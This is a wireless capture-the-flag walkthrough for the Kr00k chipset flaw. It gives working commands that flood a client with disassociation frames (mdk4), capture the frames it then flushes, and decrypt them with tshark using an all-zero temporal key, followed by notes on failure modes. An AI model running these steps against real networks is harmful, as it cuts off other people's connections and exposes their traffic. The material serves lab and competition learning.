# Kr00k walkthrough

Force a disassoc on a vulnerable client, capture the tail frames it
sends with PTK=0, decrypt them offline with a known-zero key.

## Preconditions

- Target client uses a vulnerable Broadcom/Cypress/QCA chipset.
  Fingerprint via probe-request IE order + OUI or by pcap capture
  of a prior 4-way handshake (see `client_fingerprints.json`).
- Monitor + injection interface on the attacker (wlan1mon on the
  Pineapple Mark VII).
- Target is associated to some AP and passing traffic.

## Steps

```
# 1. Confirm client is passing traffic on channel N.
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan1mon

# 2. Force a disassoc — this is the trigger, not a general deauth.
#    aireplay-ng has no --disassoc; use scapy/mdk4 to send real
#    disassoc frames, or fall back to -0 (deauth) if the client
#    treats deauth and disassoc equivalently at the chipset layer.
#    Example with mdk4 disassoc-flood (mode d):
mdk4 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF

# 3. Capture the tail frames the chipset flushes with TK=0.
#    airodump keeps running from step 1; save the .cap.

# 4. Decrypt offline. Kr00k zeroes the **TK** (temporal key), not
#    the PMK/PSK — so the tshark UAT entry must use key type "tk",
#    matching KRACK-path-B. The zero key is 16 hex zeros for
#    CCMP-128 / TKIP; 32 hex zeros for GCMP-256 or CCMP-256.
#    In Wireshark:
#       Edit -> Preferences -> Protocols -> IEEE 802.11
#       Decryption keys: add key type "tk" with
#                        16 zero bytes as hex (00 * 16) for CCMP-128
#    Or with tshark:
tshark -r kr00k.cap -o "wlan.enable_decryption:TRUE" \
       -o "uat:80211_keys:\"tk\",\"00000000000000000000000000000000\""
```

The plaintext of those tail frames is the flag surface. In a WCTF this
is usually a few TCP or UDP payload bytes containing the flag string,
or an HTTP request whose Host header identifies which SSID the client
was actually visiting.

## Failure modes

- **No tail frames captured.** Client is patched, or the chipset only
  had 0 frames queued at disassoc time. Wait for busier traffic and
  retry.
- **Frames captured but decrypt yields garbage.** Client is not Kr00k-
  vulnerable — the PTK wasn't zeroed, the frames are still encrypted
  with the real key.
- **PMF-required AP.** The disassoc drops. Kr00k is specifically about
  the *client's* handling of disassoc; if you can't get the disassoc to
  the client, the primitive doesn't fire.

## Cite

- ESET Kr00k white paper (§4 "Exploitation").
- aircrack-ng documentation — `aireplay-ng -0` (deauth); mdk4 mode
  `d` (disassoc flood); `--disassoc` is not a valid aireplay-ng
  flag.
